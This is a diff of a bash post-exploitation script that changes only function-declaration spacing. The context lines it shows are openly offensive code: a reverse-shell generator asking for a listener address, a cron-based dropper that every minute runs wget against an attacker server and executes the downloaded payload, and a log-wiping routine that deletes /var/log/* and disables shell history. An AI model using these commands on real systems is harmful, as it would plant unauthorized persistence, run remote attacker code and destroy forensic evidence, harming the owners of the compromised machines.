@@ -13,7 +13,7 @@ function display_output(){
 		}
 
 
-function genpayload() {
+function genpayload(){
 
 		payloads=(
 
@@ -27,7 +27,7 @@ function genpayload() {
 		)
 
 
-		function encshell() {
+		function encshell(){
 
 				echo -e "Enter listener server address and port\n"
 				read -r -p "Address: " address
@@ -83,14 +83,14 @@ function genpayload() {
 }
 
 
-function cron() {
+function cron(){
 
 		read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
 		read -r -p "Enter name of payload to be executed: " payload
 		cronjob="* * * * * wget $server ; sh $payload"
 		clear
 
-		function command() {
+		function command(){
 		
 				echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
 				echo -e "\ncommand saved as command.txt\n"
@@ -101,7 +101,7 @@ function cron() {
 		}
 
 
-		function add2sys() {
+		function add2sys(){
 		
 				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
 				echo -e "\nAdded cron job to crontab\n"
@@ -132,7 +132,7 @@ function cron() {
 }
 
 
-function clearlog() {
+function clearlog(){
 
 		rm -rf /var/log/*
 		export HISTFILE=
@@ -150,7 +150,7 @@ function clearlog() {
 }
 
 
-function info() {
+function info(){
 
 		declare -a post=(
 
